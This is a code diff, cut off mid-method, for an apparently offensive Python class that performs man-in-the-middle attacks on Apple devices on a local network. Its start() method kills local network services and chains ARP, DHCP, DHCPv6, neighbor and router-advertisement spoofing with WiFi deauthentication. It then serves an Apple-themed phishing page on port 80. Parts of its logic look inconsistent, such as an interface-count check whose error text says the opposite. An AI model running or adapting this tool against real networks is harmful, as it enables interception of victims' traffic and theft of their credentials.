@@ -56,6 +56,7 @@ class AppleMitm:
     _base: Base = Base(admin_only=True, available_platforms=['Linux', 'Darwin', 'Windows'])
     _utils: Utils = Utils()
     _wifi: Union[None, WiFi] = None
+    _icmpv6_router_search: Union[None, ICMPv6RouterSearch] = None
 
     _mitm_techniques: List[str] = ['ARP Spoofing',
                                    'Second DHCP ACK',
@@ -90,8 +91,425 @@ class AppleMitm:
 
     _mtu: int = 1500
 
+    _ipv4_mitm: bool = False
+    _ipv6_mitm: bool = False
+
     _deauth_packets: int = 25
     _deauth_stop: bool = False
+    # endregion
+
+    # region Start MiTM
+    def start(self,
+              mitm_technique: Union[None, int] = None,
+              disconnect_technique: Union[None, int] = None,
+              mitm_interface: Union[None, str] = None,
+              deauth_interface: Union[None, str] = None,
+              target_mac_address: Union[None, str] = None,
+              target_ipv4_address: Union[None, str] = None,
+              target_new_ipv4_address: Union[None, str] = None,
+              target_ipv6_address: Union[None, str] = None,
+              target_new_ipv6_address: Union[None, str] = None,
+              gateway_ipv4_address: Union[None, str] = None,
+              gateway_ipv6_address: Union[None, str] = None,
+              dns_ipv4_address: Union[None, str] = None,
+              dns_ipv6_address: Union[None, str] = None,
+              ipv6_prefix: Union[None, str] = None,
+              phishing_site: Union[None, str] = None):
+
+        # region Variables
+        thread_manager: ThreadManager = ThreadManager(10)
+
+        mitm_network_interface: Union[None, str] = None
+        deauth_network_interface: Union[None, str] = None
+
+        disconnect: bool = False
+        deauth: bool = False
+        # endregion
+
+        # region Kill subprocess
+        if self._base.get_platform().startswith('Linux'):
+            try:
+                self._base.print_info('Stop services: ', 'dnsmasq, network-manager')
+                run(['service dnsmasq stop  >/dev/null 2>&1'], shell=True)
+                run(['service network-manager stop  >/dev/null 2>&1'], shell=True)
+            except OSError:
+                self._base.print_error('Something went wrong while trying to stop services:',
+                                       'dnsmasq and network-manager')
+                exit(1)
+
+        # Kill the processes that listens on 53, 68, 547 UDP port, 80 and 443 TCP ports
+        self._base.print_info('Stop processes that listens on UDP ports: ', '53, 68, 547')
+        self._base.kill_processes_by_listen_port(53, 'udp')
+        self._base.kill_processes_by_listen_port(68, 'udp')
+        self._base.kill_processes_by_listen_port(547, 'udp')
+
+        self._base.print_info('Stop processes that listens on TCP ports: ', '80, 443')
+        self._base.kill_processes_by_listen_port(80, 'tcp')
+        self._base.kill_processes_by_listen_port(443, 'tcp')
+        # endregion
+
+        # region MiTM technique selection
+        if self._base.get_platform().startswith('Windows') or self._base.get_platform().startswith('Darwin'):
+            self._mitm_techniques.remove('Second DHCP ACK')
+            self._disconnect_techniques.remove('Send WiFi deauthentication packets')
+
+        if mitm_technique is None:
+            self._base.print_info('MiTM technique list:')
+            _technique_pretty_table = PrettyTable([self._base.cINFO + 'Index' + self._base.cEND,
+                                                   self._base.cINFO + 'MiTM technique' + self._base.cEND])
+            for _technique_index in range(len(self._mitm_techniques)):
+                _technique_pretty_table.add_row([str(_technique_index + 1),
+                                                 self._mitm_techniques[_technique_index]])
+            print(_technique_pretty_table)
+            print(self._base.c_info + 'Set MiTM technique index from range (1 - ' +
+                  str(len(self._mitm_techniques)) + '): ', end='')
+            _test_technique = input()
+            assert _test_technique.isdigit(), \
+                'MiTM technique index is not digit!'
+        else:
+            _test_technique = mitm_technique
+        self._mitm_technique = \
+            self._utils.check_value_in_range(value=int(_test_technique),
+                                             first_value=1, last_value=len(self._mitm_techniques),
+                                             parameter_name='MiTM technique') - 1
+        # endregion
+
+        # region Disconnect technique selection
+        if self._mitm_techniques[self._mitm_technique] == 'Second DHCP ACK':
+            disconnect = True
+            deauth = True
+
+        else:
+            if disconnect_technique is None:
+                self._base.print_info('Disconnect technique list:')
+                _disconnect_pretty_table = PrettyTable([self._base.cINFO + 'Index' + self._base.cEND,
+                                                        self._base.cINFO + 'Disconnect technique' + self._base.cEND])
+                for _technique_index in range(len(self._disconnect_techniques)):
+                    _disconnect_pretty_table.add_row([str(_technique_index + 1),
+                                                      self._disconnect_techniques[_technique_index]])
+                print(_disconnect_pretty_table)
+                print(self._base.c_info + 'Set Disconnect technique index from range (1 - ' +
+                      str(len(self._disconnect_techniques)) + '): ')
+                _test_technique = input()
+                assert _test_technique.isdigit(), \
+                    'Disconnect technique index is not digit!'
+            else:
+                _test_technique = disconnect_technique
+            self._disconnect_technique = \
+                self._utils.check_value_in_range(value=int(_test_technique),
+                                                 first_value=1, last_value=len(self._disconnect_techniques),
+                                                 parameter_name='Disconnect technique') - 1
+
+            # Do not disconnect device after MiTM
+            if self._disconnect_techniques[self._disconnect_technique] == 'Do not disconnect device after MiTM':
+                disconnect = False
+                deauth = False
+
+            # Use WiFi deauthentication disconnect technique
+            elif self._disconnect_techniques[self._disconnect_technique] == 'Send WiFi deauthentication packets':
+                disconnect = True
+                deauth = True
+
+            # Use IPv4 network conflict disconnect technique
+            else:
+                disconnect = True
+                deauth = False
+
+        # endregion
+
+        # region Get MiTM network interface
+        mitm_network_interface = \
+            self._base.network_interface_selection(interface_name=mitm_interface,
+                                                   message='Please select a network interface for '
+                                                           'MiTM Apple devices from table: ')
+        self._your = self._base.get_interface_settings(interface_name=mitm_network_interface,
+                                                       required_parameters=['mac-address', 'ipv4-address'])
+        if self._your['ipv6-link-address'] is None:
+            self._your['ipv6-link-address'] = self._base.make_ipv6_link_address(self._your['mac_address'])
+        # endregion
+
+        # region Get Deauth network interface
+        if deauth:
+            assert mitm_network_interface in self._base.list_of_wireless_network_interfaces(), \
+                'Network interface: ' + self._base.error_text(mitm_network_interface) + ' is not Wireless!'
+
+            assert len(self._base.list_of_wireless_network_interfaces()) <= 1, \
+                'You have only one wireless interface: ' + self._base.info_text(mitm_interface) + \
+                '; to send WiFi deauth packets you need a second wireless interface!'
+
+            assert self._your['essid'] is not None \
+                   and self._your['bssid'] is not None \
+                   and self._your['channel'] is not None, \
+                'Network interface: ' + self._base.error_text(mitm_network_interface) + ' does not connect to AP!'
+
+            # region Set network interface for send wifi deauth packets
+            deauth_network_interface = \
+                self._base.network_interface_selection(interface_name=deauth_interface,
+                                                       exclude_interface=mitm_interface,
+                                                       only_wireless=True,
+                                                       message='Please select a network interface for '
+                                                               'send WiFi deauth packets from table: ')
+
+            self._wifi = WiFi(wireless_interface=deauth_network_interface,
+                              wifi_channel=self._your['channel'], debug=False, start_scan=False)
+
+        # endregion
+
+        # region Check IPv4 or IPv6 mitm
+        if self._mitm_techniques[self._mitm_technique] in \
+                ['ARP Spoofing', 'Second DHCP ACK', 'Predict next DHCP transaction ID']:
+            self._ipv4_mitm = True
+        elif self._mitm_techniques[self._mitm_technique] in \
+                ['Rogue SLAAC/DHCPv6 server', 'NA Spoofing (IPv6)', 'RA Spoofing (IPv6)']:
+            self._ipv6_mitm = True
+        # endregion
+
+        # region Set IPv4 DNS server
+        if self._ipv4_mitm:
+            if dns_ipv4_address is not None:
+                self._dns_server['ipv4-address'] = \
+                    self._utils.check_ipv4_address(network_interface=mitm_network_interface,
+                                                   ipv4_address=dns_ipv4_address,
+                                                   is_local_ipv4_address=False,
+                                                   parameter_name='DNS server IPv4 address')
+            else:
+                self._dns_server['ipv4-address'] = self._your['ipv4-address']
+        # endregion
+
+        # region Set IPv6 DNS server
+        if self._ipv6_mitm:
+            if dns_ipv6_address is not None:
+                self._dns_server['ipv6-address'] = \
+                    self._utils.check_ipv6_address(network_interface=mitm_network_interface,
+                                                   ipv6_address=gateway_ipv6_address,
+                                                   is_local_ipv6_address=False,
+                                                   parameter_name='gateway IPv6 address',
+                                                   check_your_ipv6_address=False)
+            else:
+                self._dns_server['ipv6-address'] = self._your['ipv6-link-address']
+        # endregion
+
+        # region Set IPv4 gateway
+        if self._ipv4_mitm:
+            if gateway_ipv4_address is not None:
+                self._gateway['ipv4-address'] = \
+                    self._utils.check_ipv4_address(network_interface=mitm_network_interface,
+                                                   ipv4_address=gateway_ipv4_address,
+                                                   is_local_ipv4_address=True,
+                                                   parameter_name='gateway IPv4 address')
+            else:
+                if self._mitm_techniques[self._mitm_technique] == 'ARP Spoofing':
+                    assert self._your['ipv4-gateway'] is not None, \
+                        'Network interface: ' + self._base.error_text(mitm_network_interface) + \
+                        ' does not have IPv4 gateway!'
+                    self._gateway['ipv4-address'] = self._your['ipv4-gateway']
+                else:
+                    self._gateway['ipv4-address'] = self._your['ipv4-address']
+        # endregion
+
+        # region Set IPv6 gateway
+        if self._ipv6_mitm:
+            if gateway_ipv6_address is not None:
+                self._gateway['ipv6-address'] = \
+                    self._utils.check_ipv6_address(network_interface=mitm_network_interface,
+                                                   ipv6_address=gateway_ipv6_address,
+                                                   is_local_ipv6_address=True,
+                                                   parameter_name='gateway IPv6 address',
+                                                   check_your_ipv6_address=False)
+            else:
+                if self._mitm_techniques[self._mitm_technique] == 'Rogue SLAAC/DHCPv6 server':
+                    self._gateway['ipv6-address'] = self._your['ipv6-link-address']
+                else:
+                    self._base.print_info('Search IPv6 Gateway and DNS server on interface: ', mitm_interface)
+                    self._icmpv6_router_search: ICMPv6RouterSearch = \
+                        ICMPv6RouterSearch(network_interface=mitm_network_interface)
+                    _router_advertisement_data = \
+                        self._icmpv6_router_search.search(timeout=5, retry=3, exit_on_failure=True)
+
+                    assert _router_advertisement_data is not None, \
+                        'Can not find IPv6 gateway in local network on interface: ' + \
+                        self._base.error_text(mitm_network_interface)
+
+                    self._gateway['ipv6-address'] = _router_advertisement_data['router_ipv6_address']
+
+                    if 'dns-server' in _router_advertisement_data.keys():
+                        self._dns_server['ipv6-address'] = _router_advertisement_data['dns-server']
+
+                    if 'prefix' in _router_advertisement_data.keys():
+                        self._ipv6_network_prefix = _router_advertisement_data['prefix']
+                    elif ipv6_prefix is not None:
+                        self._ipv6_network_prefix = ipv6_prefix
+
+                    if 'mtu' in _router_advertisement_data.keys():
+                        self._mtu = int(_router_advertisement_data['mtu'])
+        # endregion
+
+        # region Set target IPv4 address and new IPv4 address
+        if self._ipv4_mitm:
+            self._target = \
+                self._utils.set_ipv4_target(network_interface=mitm_network_interface,
+                                            target_ipv4_address=target_ipv4_address,
+                                            target_mac_address=target_mac_address,
+                                            target_vendor='apple',
+                                            target_ipv4_address_required=False,
+                                            exclude_ipv4_addresses=[self._your['ipv4-gateway']])
+
+            # region Set target new IPv4 address
+            if self._mitm_techniques[self._mitm_technique] == 'Predict next DHCP transaction ID':
+                if target_new_ipv4_address is not None:
+                    self._target['new-ipv4-address'] = \
+                        self._utils.check_ipv4_address(network_interface=mitm_network_interface,
+                                                       ipv4_address=target_new_ipv4_address,
+                                                       is_local_ipv4_address=True,
+                                                       parameter_name='target new IPv4 address')
+                else:
+                    _free_ipv4_addresses = \
+                        self._utils.get_free_ipv4_addresses(network_interface=mitm_network_interface)
+                    self._target['new-ipv4-address'] = choice(_free_ipv4_addresses)
+            # endregion
+        
+        # endregion
+
+        # region Set target IPv6 address
+        if self._ipv6_mitm:
+            self._target = \
+                self._utils.set_ipv6_target(network_interface=mitm_network_interface,
+                                            target_ipv6_address=target_ipv6_address,
+                                            target_mac_address=target_mac_address,
+                                            target_vendor='apple',
+                                            target_ipv6_address_is_local=True,
+                                            exclude_ipv6_addresses=[self._your['ipv6-gateway']])
+
+            # region Set target new IPv6 address
+            if self._mitm_techniques[self._mitm_technique] == 'Rogue SLAAC/DHCPv6 server':
+                if target_new_ipv6_address is not None:
+                    self._target['new-ipv6-address'] = \
+                        self._utils.check_ipv6_address(network_interface=mitm_network_interface,
+                                                       ipv6_address=target_new_ipv4_address,
+                                                       is_local_ipv6_address=False,
+                                                       parameter_name='target new global IPv6 address',
+                                                       check_your_ipv6_address=True)
+                else:
+                    self._target['new-ipv6-address'] = \
+                        self._ipv6_network_prefix.split('/')[0] + format(randint(1, 65535), 'x')
+            # endregion
+
+        # endregion
+
+        # region General output
+        self._base.print_info('MiTM technique: ', self._mitm_techniques[self._mitm_technique])
+        self._base.print_info('Disconnect technique: ', self._disconnect_techniques[self._disconnect_technique])
+        self._base.print_info('Network interface: ', mitm_network_interface)
+        self._base.print_info('Your MAC address: ', self._your['mac-address'])
+
+        # region IPv4 MiTM
+        if self._ipv4_mitm:
+            self._base.print_info('Your IPv4 address: ', self._your['ipv4-address'])
+            self._base.print_info('Gateway IPv4 address: ', self._gateway['ipv4-address'])
+
+            if self._mitm_techniques[self._mitm_technique] != 'ARP Spoofing':
+                self._base.print_info('DNS server IPv4 address: ', self._dns_server['ipv4-address'])
+
+            if self._target['mac-address'] is not None:
+                self._base.print_info('Target MAC address: ', self._target['mac-address'])
+
+            if self._target['ipv4-address'] is not None:
+                self._base.print_info('Target IPv4 address: ', self._target['ipv4-address'])
+
+            if 'new-ipv4-address' in self._target.keys():
+                if self._target['new-ipv4-address'] is not None:
+                    self._base.print_info('Target new IPv4 address: ', self._target['new-ipv4-address'])
+        # endregion
+        
+        # region IPv6 MiTM
+        if self._ipv6_mitm:
+            self._base.print_info('Your IPv6 local address: ', self._your['ipv6-link-address'])
+            self._base.print_info('Prefix: ', self._ipv6_network_prefix)
+            self._base.print_info('Gateway IPv6 address: ', self._gateway['ipv6-address'])
+            self._base.print_info('DNS server IPv6 address: ', self._dns_server['ipv6-address'])
+
+            if self._target['mac-address'] is not None:
+                self._base.print_info('Target MAC address: ', self._target['mac-address'])
+
+            if self._target['ipv6-address'] is not None:
+                self._base.print_info('Target IPv6 address: ', self._target['ipv6-address'])
+
+            if 'new-ipv6-address' in self._target.keys():
+                if self._target['new-ipv6-address'] is not None:
+                    self._base.print_info('Target new global IPv6 address: ', self._target['new-ipv6-address'])
+        # endregion
+        
+        # region WiFi info
+        if deauth:
+            self._base.print_info('Interface ', mitm_network_interface, 
+                                  ' connected to: ', self._your['essid'] + ' (' + self._your['bssid'] + ')')
+            self._base.print_info('Interface ', mitm_network_interface, ' channel: ', self._your['channel'])
+            self._base.print_info('Deauth network interface: ', deauth_network_interface)
+        # endregion
+        
+        # endregion
+
+        # region Start DNS server
+        if self._dns_server['ipv4-address'] == self._your['ipv4-address'] or \
+                self._dns_server['ipv6-address'] == self._your['ipv6-link-address']:
+            self._base.print_info('Start DNS server ...')
+            thread_manager.add_task(self._start_dns_server)
+        # endregion
+
+        # region Disconnect device
+        if disconnect:
+            thread_manager.add_task(self._disconnect_device, deauth)
+        # endregion
+
+        # region Start IPv4 MiTM
+        if self._ipv4_mitm:
+            
+            # region 1. ARP spoofing technique
+            if self._mitm_techniques[self._mitm_technique] == 'ARP Spoofing':
+                thread_manager.add_task(self._arp_spoof)
+            # endregion
+    
+            # region 2. Second DHCP ACK technique
+            elif self._mitm_techniques[self._mitm_technique] == 'Second DHCP ACK':
+                thread_manager.add_task(self._dhcpv4_server)
+            # endregion
+    
+            # region 3. Predict next DHCP transaction ID
+            elif self._mitm_techniques[self._mitm_technique] == 'Predict next DHCP transaction ID':
+                thread_manager.add_task(self._apple_dhcpv4_server)
+            # endregion
+        
+        # endregion
+
+        # region Start IPv6 MiTM
+        if self._ipv6_mitm:
+        
+            # region 4. Rogue SLAAC/DHCPv6 server
+            if self._mitm_techniques[self._mitm_technique] == 'Rogue SLAAC/DHCPv6 server':
+                thread_manager.add_task(self._dhcpv6_server)
+            # endregion
+    
+            # region 5. NA Spoofing (IPv6)
+            elif self._mitm_techniques[self._mitm_technique] == 'NA Spoofing (IPv6)':
+                thread_manager.add_task(self._na_spoof)
+            # endregion
+    
+            # region 6. RA Spoofing (IPv6)
+            elif self._mitm_techniques[self._mitm_technique] == 'RA Spoofing (IPv6)':
+                thread_manager.add_task(self._ra_spoof)
+            # endregion
+        
+        # endregion
+
+        # region Start Phishing server
+        if phishing_site is None:
+            phishing_site = 'apple'
+        
+        phishing_server: PhishingServer = PhishingServer()
+        phishing_server.start(address='0.0.0.0', port=80, site=phishing_site,
+                              redirect='authentication.net', quiet=True)
+        # endregion
+
     # endregion
 
     # region Disconnect device
@@ -100,9 +518,14 @@ class AppleMitm:
         if not deauth:
             # Start Network Conflict Creator (ncc)
             ncc: NetworkConflictCreator = NetworkConflictCreator(network_interface=self._your['network-interface'])
-            ncc.start(target_mac_address=self._target['mac-address'],
-                      target_ip_address=self._target['ipv4-address'],
-                      exit_on_success=True)
+            if self._ipv4_mitm:
+                ncc.start(target_mac_address=self._target['mac-address'],
+                          target_ip_address=self._target['ipv4-address'],
+                          exit_on_success=True)
+            else:
+                ncc.start(target_mac_address=self._target['mac-address'],
+                          target_ip_address=self._target['ipv4-address'],
+                          exit_on_success=False)
 
         else:
             # Start WiFi deauth packets sender
@@ -228,389 +651,6 @@ class AppleMitm:
 
     # endregion
 
-    # region Start MiTM
-    def start(self,
-              mitm_technique: Union[None, int] = None,
-              disconnect_technique: Union[None, int] = None,
-              mitm_interface: Union[None, str] = None,
-              deauth_interface: Union[None, str] = None,
-              target_mac_address: Union[None, str] = None,
-              target_ipv4_address: Union[None, str] = None,
-              target_new_ipv4_address: Union[None, str] = None,
-              target_ipv6_address: Union[None, str] = None,
-              target_new_ipv6_address: Union[None, str] = None,
-              gateway_ipv4_address: Union[None, str] = None,
-              gateway_ipv6_address: Union[None, str] = None,
-              dns_ipv4_address: Union[None, str] = None,
-              dns_ipv6_address: Union[None, str] = None,
-              ipv6_prefix: Union[None, str] = None,
-              phishing_site: Union[None, str] = None):
-
-        # region Variables
-        thread_manager: ThreadManager = ThreadManager(10)
-
-        mitm_network_interface: Union[None, str] = None
-        deauth_network_interface: Union[None, str] = None
-
-        disconnect: bool = False
-        deauth: bool = False
-        # endregion
-
-        # region Kill subprocess
-        if self._base.get_platform().startswith('Linux'):
-            try:
-                self._base.print_info('Stop services: ', 'dnsmasq, network-manager')
-                run(['service dnsmasq stop  >/dev/null 2>&1'], shell=True)
-                run(['service network-manager stop  >/dev/null 2>&1'], shell=True)
-            except OSError:
-                self._base.print_error('Something went wrong while trying to stop services:',
-                                       'dnsmasq and network-manager')
-                exit(1)
-
-        # Kill the processes that listens on 53, 68, 547 UDP port, 80 and 443 TCP ports
-        self._base.print_info('Stop processes that listens on UDP ports: ', '53, 68, 547')
-        self._base.kill_processes_by_listen_port(53, 'udp')
-        self._base.kill_processes_by_listen_port(68, 'udp')
-        self._base.kill_processes_by_listen_port(547, 'udp')
-
-        self._base.print_info('Stop processes that listens on TCP ports: ', '80, 443')
-        self._base.kill_processes_by_listen_port(80, 'tcp')
-        self._base.kill_processes_by_listen_port(443, 'tcp')
-        # endregion
-
-        # region MiTM technique selection
-        if mitm_technique is None:
-            self._base.print_info('MiTM technique list:')
-            _technique_pretty_table = PrettyTable([self._base.cINFO + 'Index' + self._base.cEND,
-                                                   self._base.cINFO + 'MiTM technique' + self._base.cEND])
-            for _technique_key in self._mitm_techniques.keys():
-                _technique_pretty_table.add_row([str(_technique_key), self._mitm_techniques[_technique_key]])
-            print(_technique_pretty_table)
-            print(self._base.c_info + 'Set MiTM technique index from range (1 - ' +
-                  str(len(self._mitm_techniques.keys())) + '): ', end='')
-            _test_technique = input()
-            assert _test_technique.isdigit(), \
-                'MiTM technique index is not digit!'
-        else:
-            _test_technique = mitm_technique
-        self._mitm_technique = \
-            self._utils.check_value_in_range(value=int(_test_technique),
-                                             first_value=1, last_value=len(self._mitm_techniques),
-                                             parameter_name='MiTM technique')
-        # endregion
-
-        # region Disconnect technique selection
-        if disconnect_technique is None:
-            self._base.print_info('Disconnect technique list:')
-            _disconnect_pretty_table = PrettyTable([self._base.cINFO + 'Index' + self._base.cEND,
-                                                    self._base.cINFO + 'Disconnect technique' + self._base.cEND])
-            for _technique_key in self._disconnect_techniques.keys():
-                _disconnect_pretty_table.add_row([str(_technique_key), self._disconnect_techniques[_technique_key]])
-            print(_disconnect_pretty_table)
-            print(self._base.c_info + 'Set Disconnect technique index from range (1 - ' +
-                  str(len(self._disconnect_techniques.keys())) + '): ')
-            _test_technique = input()
-            assert _test_technique.isdigit(), \
-                'Disconnect technique index is not digit!'
-        else:
-            _test_technique = disconnect_technique
-        self._utils.check_value_in_range(value=int(_test_technique),
-                                         first_value=1, last_value=len(self._disconnect_techniques),
-                                         parameter_name='Disconnect technique')
-        self._disconnect_technique = int(_test_technique)
-
-        # Do not disconnect device after MiTM
-        if self._disconnect_technique == 3:
-            disconnect = False
-
-        # Use disconnect technique
-        else:
-            disconnect = True
-
-            # Use IPv4 network conflict detection
-            if self._disconnect_technique == 1:
-
-                if self._mitm_technique in [1, 3]:
-                    deauth = False
-
-                else:
-                    self._base.print_error('You chose MiTM technique: ', self._mitm_techniques[self._mitm_technique],
-                                           ' but this technique works only with WiFi deauthentication disconnect')
-                    self._base.print_info('Change disconnect technique to: ', self._disconnect_techniques[2])
-                    deauth = True
-
-            # Use WiFi deauthentication
-            if self._disconnect_technique == 2:
-                deauth = True
-
-        # endregion
-
-        # region Get listen network interface, your IP address, first and last IP in local network
-        mitm_network_interface = \
-            self._base.network_interface_selection(interface_name=mitm_interface,
-                                                   message='Please select a network interface for '
-                                                           'MiTM Apple devices from table: ')
-        self._your = self._base.get_interface_settings(interface_name=mitm_network_interface,
-                                                       required_parameters=['mac-address', 'ipv4-address'])
-        if self._your['ipv6-link-address'] is None:
-            self._your['ipv6-link-address'] = self._base.make_ipv6_link_address(self._your['mac_address'])
-
-        self._icmpv6_scan = ICMPv6Scan(network_interface=mitm_network_interface)
-        self._scanner = Scanner(network_interface=mitm_network_interface)
-        # endregion
-
-        # region Set IPv4 DNS server
-        if self._mitm_technique in [1, 2, 3]:
-            if dns_ipv4_address is not None:
-                self._dns_server['ipv4-address'] = \
-                    self._utils.check_ipv4_address(network_interface=mitm_network_interface,
-                                                   ipv4_address=dns_ipv4_address,
-                                                   is_local_ipv4_address=False,
-                                                   parameter_name='DNS server IPv4 address')
-            else:
-                self._dns_server['ipv4-address'] = self._your['ipv4-address']
-        # endregion
-
-        # region Set IPv6 DNS server
-        if self._mitm_technique in [4, 5, 6]:
-            if dns_ipv6_address is not None:
-                self._dns_server['ipv6-address'] = \
-                    self._utils.check_ipv6_address(network_interface=mitm_network_interface,
-                                                   ipv6_address=gateway_ipv6_address,
-                                                   is_local_ipv6_address=False,
-                                                   parameter_name='gateway IPv6 address')
-            else:
-                self._dns_server['ipv6-address'] = self._your['ipv6-link-address']
-        # endregion
-
-        # region Set IPv4 gateway
-        if self._mitm_technique in [1, 2, 3]:
-            if gateway_ipv4_address is not None:
-                self._gateway['ipv4-address'] = \
-                    self._utils.check_ipv4_address(network_interface=mitm_network_interface,
-                                                   ipv4_address=gateway_ipv4_address,
-                                                   is_local_ipv4_address=True,
-                                                   parameter_name='gateway IPv4 address')
-            else:
-                if self._mitm_technique == 1:
-                    assert self._your['ipv4-gateway'] is not None, \
-                        'Network interface: ' + self._base.error_text(mitm_network_interface) + \
-                        ' does not have IPv4 gateway!'
-                    self._gateway['ipv4-address'] = self._your['ipv4-gateway']
-                else:
-                    self._gateway['ipv4-address'] = self._your['ipv4-address']
-        # endregion
-
-        # region Set IPv6 gateway
-        if self._mitm_technique in [4, 5, 6]:
-            if gateway_ipv6_address is not None:
-                self._gateway['ipv6-address'] = \
-                    self._utils.check_ipv6_address(network_interface=mitm_network_interface,
-                                                   ipv6_address=gateway_ipv6_address,
-                                                   is_local_ipv6_address=True,
-                                                   parameter_name='gateway IPv6 address')
-            else:
-                if self._mitm_technique == 4:
-                    self._gateway['ipv6-address'] = self._your['ipv6-link-address']
-                else:
-                    self._base.print_info('Search IPv6 Gateway and DNS server ...')
-                    _router_advertisement_data = \
-                        self._icmpv6_scan.search_router(timeout=5, retry=3, exit_on_failure=False)
-
-                    assert _router_advertisement_data is not None, \
-                        'Can not find IPv6 gateway in local network on interface: ' + \
-                        self._base.error_text(mitm_network_interface)
-
-                    self._gateway['ipv6-address'] = _router_advertisement_data['router_ipv6_address']
-
-                    if 'dns-server' in _router_advertisement_data.keys():
-                        self._dns_server['ipv6-address'] = _router_advertisement_data['dns-server']
-
-                    if 'prefix' in _router_advertisement_data.keys():
-                        self._ipv6_network_prefix = _router_advertisement_data['prefix']
-                    elif ipv6_prefix is not None:
-                        self._ipv6_network_prefix = ipv6_prefix
-
-                    if 'mtu' in _router_advertisement_data.keys():
-                        self._mtu = int(_router_advertisement_data['mtu'])
-        # endregion
-
-        # region Get network interface for send wifi deauth packets, get wifi settings from listen network interface
-        if deauth_interface is not None:
-            deauth = True
-
-        if self._mitm_technique == 2:
-            deauth = True
-
-        if deauth:
-            assert mitm_network_interface not in self._base.list_of_wireless_network_interfaces(), \
-                'Network interface: ' + self._base.error_text(mitm_network_interface) + ' is not Wireless!'
-
-            assert self._your['essid'] is None or self._your['bssid'] is None or self._your['channel'] is None, \
-                'Network interface: ' + self._base.error_text(mitm_network_interface) + ' does not connect to AP!'
-
-            # region Set network interface for send wifi deauth packets
-            deauth_network_interface = \
-                self._base.network_interface_selection(interface_name=deauth_interface,
-                                                       message='Please select a network interface for '
-                                                               'send WiFi deauth packets from table: ')
-
-            assert mitm_network_interface != deauth_network_interface, \
-                'Network interface for listening target requests: ' + self._base.info_text(mitm_network_interface) + \
-                ' and network interface for send WiFi deauth packets: ' + self._base.info_text(deauth_network_interface) + \
-                ' must be differ!'
-            # endregion
-
-        # endregion
-
-        # region Check wireless network interface for send wifi deauth packets
-        if deauth:
-            self._wifi = WiFi(wireless_interface=deauth_network_interface,
-                              wifi_channel=self._your['channel'], debug=False, start_scan=False)
-        # endregion
-
-        # region Set target IPv4 address
-        if self._mitm_technique in [1, 2, 3]:
-            self._target = \
-                self._utils.set_ipv4_target(network_interface=mitm_network_interface,
-                                            target_ipv4_address=target_ipv4_address,
-                                            target_mac_address=target_mac_address,
-                                            target_vendor='apple',
-                                            target_ipv4_address_required=False,
-                                            exclude_ipv4_addresses=[self._your['ipv4-gateway']])
-        # endregion
-
-        # region Set target new IPv4 address
-        if self._mitm_technique == 3:
-            if target_new_ipv4_address is not None:
-                self._target['new-ipv4-address'] = \
-                    self._utils.check_ipv4_address(network_interface=mitm_network_interface,
-                                                   ipv4_address=target_new_ipv4_address,
-                                                   is_local_ipv4_address=True,
-                                                   parameter_name='target new IPv4 address')
-            else:
-                _free_ipv4_addresses = self._scanner.get_free_ipv4_addresses()
-                self._target['new-ipv4-address'] = choice(_free_ipv4_addresses)
-        # endregion
-
-        # region Set target IPv6 address
-        if self._mitm_technique in [4, 5, 6]:
-            self._target = \
-                self._utils.set_ipv6_target(network_interface=mitm_network_interface,
-                                            target_ipv6_address=target_ipv6_address,
-                                            target_mac_address=target_mac_address,
-                                            target_vendor='apple',
-                                            target_ipv6_address_is_local=True,
-                                            exclude_ipv6_addresses=[self._your['ipv6-gateway']])
-        # endregion
-
-        # region Set target new IPv6 address
-        if self._mitm_technique == 4:
-            if target_new_ipv6_address is not None:
-                self._target['new-ipv6-address'] = \
-                    self._utils.check_ipv6_address(network_interface=mitm_network_interface,
-                                                   ipv6_address=target_new_ipv4_address,
-                                                   is_local_ipv6_address=False,
-                                                   parameter_name='target new global IPv6 address')
-            else:
-                self._target['new-ipv6-address'] = \
-                    self._ipv6_network_prefix.split('/')[0] + format(randint(1, 65535), 'x')
-        # endregion
-
-        # region General output
-        self._base.print_info('MiTM technique: ', self._mitm_techniques[self._mitm_technique])
-        self._base.print_info('Disconnect technique: ', self._disconnect_techniques[self._disconnect_technique])
-
-        self._base.print_info('Network interface: ', mitm_network_interface)
-        self._base.print_info('Your MAC address: ', self._your['mac-address'])
-
-        if self._mitm_technique in [1, 2, 3]:
-            self._base.print_info('Your IPv4 address: ', self._your['ipv4-address'])
-            self._base.print_info('Gateway IPv4 address: ', self._gateway['ipv4-address'])
-            self._base.print_info('DNS server IPv4 address: ', self._dns_server['ipv4-address'])
-
-            if self._target['mac-address'] is not None:
-                self._base.print_info('Target MAC address: ', self._target['mac-address'])
-
-            self._base.print_info('Target IPv4 address: ', self._target['ipv4-address'])
-
-            if self._mitm_technique == 3:
-                self._base.print_info('Target new IPv4 address: ', self._target['new-ipv4-address'])
-
-        if self._mitm_technique in [4, 5, 6]:
-            self._base.print_info('Your IPv6 local address: ', self._your['ipv6-link-address'])
-            self._base.print_info('Prefix: ', self._ipv6_network_prefix)
-            self._base.print_info('Gateway IPv6 address: ', self._gateway['ipv6-address'])
-            self._base.print_info('DNS server IPv6 address: ', self._dns_server['ipv6-address'])
-
-            if self._target['mac-address'] is not None:
-                self._base.print_info('Target MAC address: ', self._target['mac-address'])
-
-            if self._target['ipv6-address'] is not None:
-                self._base.print_info('Target IPv6 address: ', self._target['ipv6-address'])
-
-            if self._target['new-ipv6-address'] is not None:
-                self._base.print_info('Target new global IPv6 address: ', self._target['new-ipv6-address'])
-
-        if deauth:
-            self._base.print_info('Interface ', mitm_network_interface, ' connected to: ',
-                                  self._your['essid'] + ' (' + self._your['bssid'] + ')')
-            self._base.print_info('Interface ', mitm_network_interface, ' channel: ', self._your['channel'])
-            self._base.print_info('Deauth network interface: ', deauth_network_interface)
-        # endregion
-
-        # region Run DNS server
-        if self._dns_server['ipv4-address'] == self._your['ipv4-address'] or \
-                self._dns_server['ipv6-address'] == self._your['ipv6-link-address']:
-            self._base.print_info('Start DNS server ...')
-            thread_manager.add_task(self._start_dns_server)
-        # endregion
-
-        # region 1. ARP spoofing technique
-        if self._mitm_technique == 1:
-            thread_manager.add_task(self._arp_spoof)
-        # endregion
-
-        # region 2. Second DHCP ACK technique
-        if self._mitm_technique == 2:
-            thread_manager.add_task(self._dhcpv4_server)
-        # endregion
-
-        # region 3. Predict next DHCP transaction ID
-        if self._mitm_technique == 3:
-            thread_manager.add_task(self._apple_dhcpv4_server)
-        # endregion
-
-        # region 4. Rogue SLAAC/DHCPv6 server
-        if self._mitm_technique == 4:
-            thread_manager.add_task(self._dhcpv6_server)
-        # endregion
-
-        # region 5. NA Spoofing (IPv6)
-        if self._mitm_technique == 5:
